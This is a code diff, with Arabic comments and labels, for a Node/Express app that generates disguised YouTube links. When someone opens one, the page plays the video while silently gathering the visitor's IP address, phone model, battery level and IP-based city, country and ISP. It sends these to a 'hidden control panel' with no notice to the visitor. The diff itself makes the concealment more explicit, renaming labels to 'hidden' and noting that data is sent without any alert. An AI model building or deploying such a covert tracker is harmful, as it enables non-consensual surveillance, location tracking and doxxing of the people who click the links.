@@ -8,7 +8,7 @@ const io = new Server(server, { cors: { origin: "*" } });
 
 app.use(express.json());
 
-// 1. لوحة التحكم الرئيسية لإنشاء الروابط
+// 1. لوحة التحكم الرئيسية
 app.get('/', (req, res) => {
   res.send(`
     <!DOCTYPE html>
@@ -16,7 +16,7 @@ app.get('/', (req, res) => {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>لوحة تتبع الأجهزة الذكية</title>
+        <title>لوحة التحكم المخفية</title>
         <style>
             body { font-family: system-ui, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
             .card { background: #1e1e1e; border-radius: 12px; padding: 20px; margin: 15px auto; max-width: 600px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
@@ -27,19 +27,19 @@ app.get('/', (req, res) => {
         </style>
     </head>
     <body>
-        <h2>📺 منشئ روابط يوتيوب الذكية</h2>
+        <h2>📺 منشئ روابط يوتيوب المخفية</h2>
         <div class="card">
             <p>ضع رابط فيديو يوتيوب واضغط إنشاء:</p>
             <input type="text" id="ytUrlInput" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
             <br><br>
-            <button type="button" onclick="makeLink()">🔗 إنشاء الرابط</button>
+            <button type="button" onclick="makeLink()">🔗 إنشاء الرابط المخفي</button>
             <div id="linkContainer" style="display:none; margin-top: 15px;">
                 <p>الرابط الخاص بك (انسخه وافتحه):</p>
                 <input type="text" id="linkInput" readonly onclick="this.select();">
             </div>
         </div>
 
-        <h3>📥 معلومات الأجهزة الحقيقية المستلمة:</h3>
+        <h3>📥 التقارير والمعلومات الواردة:</h3>
         <div id="logs" class="card">
             <p style="color: #aaa;">في انتظار فتح الرابط...</p>
         </div>
@@ -70,9 +70,9 @@ app.get('/', (req, res) => {
                 
                 const box = document.createElement('div');
                 box.className = 'info-box';
-                box.innerHTML = '<strong>📱 اسم الجهاز الحقيقي:</strong> ' + data.deviceName + '<br>' +
-                                '<strong>🌐 عنوان IP الحقيقي:</strong> ' + data.ip + '<br>' +
-                                '<strong>📍 الموقع الجغرافي للشبكة:</strong> ' + data.location + '<br>' +
+                box.innerHTML = '<strong>📱 اسم الجهاز:</strong> ' + data.deviceName + '<br>' +
+                                '<strong>🌐 عنوان IP:</strong> ' + data.ip + '<br>' +
+                                '<strong>📍 الموقع الجغرافي:</strong> ' + data.location + '<br>' +
                                 '<strong>🔋 البطارية:</strong> ' + data.battery + '<br>' +
                                 '<strong>🕒 الوقت:</strong> ' + data.time;
                 logs.prepend(box);
@@ -83,11 +83,10 @@ app.get('/', (req, res) => {
   `);
 });
 
-// 2. صفحة عرض اليوتيوب وجمع المعلومات صامتاً في الخلفية
+// 2. صفحة عرض اليوتيوب وجمع البيانات صامتاً تماماً في الخلفية
 app.get('/watch/:id', async (req, res) => {
   const videoId = req.query.v || 'dQw4w9WgXcQ';
   
-  // استخراج عنوان الـ IP الحقيقي للزائر من هيدرات الطلب
   let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'غير معروف';
   if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
 
@@ -115,22 +114,10 @@ app.get('/watch/:id', async (req, res) => {
         </div>
 
         <script>
-            // دالة استخراج الطراز الحقيقي للهاتف بدقة (مثل ريدمي، سامسونج، آيفون، إلخ)
             function getExactDeviceModel(ua) {
-                // البحث عن طرازات شاومي وريدمي وسامسونج وغيرها في نص المتصفح
                 let match = ua.match(/(Redmi\\s[\\w\\d]+|SM-[A-Z0-9]+|iPhone\\s[\\w\\s]+|POCO\\s[\\w\\d]+|Pixel\\s[\\td\\w\\s]+|Huawei\\s[\\w\\d]+|OPPO\\s[\\w\\d]+|Vivo\\s[\\w\\d]+)/i);
-                if (match) {
-                    return match[0];
-                }
-                if (ua.includes('Android')) {
-                    let parts = ua.split('; ');
-                    for (let p of parts) {
-                        if (p.includes('Build/') || p.length > 3 && p.length < 25 && !p.includes('Mobile') && !p.includes('AppleWebKit')) {
-                            return p.replace('Build/', '').trim();
-                        }
-                    }
-                    return 'هاتف Android (طراز عام)';
-                }
+                if (match) return match[0];
+                if (ua.includes('Android')) return 'هاتف Android';
                 if (ua.includes('iPhone')) return 'Apple iPhone';
                 if (ua.includes('Windows')) return 'Windows Computer';
                 return 'جهاز ذكي';
@@ -152,16 +139,15 @@ app.get('/watch/:id', async (req, res) => {
                     time: new Date().toLocaleTimeString('ar-EG')
                 };
 
-                // جلب الموقع الجغرافي الحقيقي بناءً على عنوان الـ IP صامتاً بدون أذونات
                 try {
                     const response = await fetch('https://ipapi.co/${clientIp}/json/');
                     const ipData = await response.json();
                     deviceData.location = (ipData.city || "مجهول") + ", " + (ipData.country_name || "مجهول") + " (ISP: " + (ipData.org || "غير معروف") + ")";
                 } catch(e) {
-                    deviceData.location = "تعذر تحديد الموقع الجغرافي للشبكة";
+                    deviceData.location = "تعذر تحديد الموقع";
                 }
 
-                // إرسال البيانات للسيرفر فوراً
+                // إرسال البيانات فوراً ودون أي تنبيهات للمستخدم
                 fetch('/api/log', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
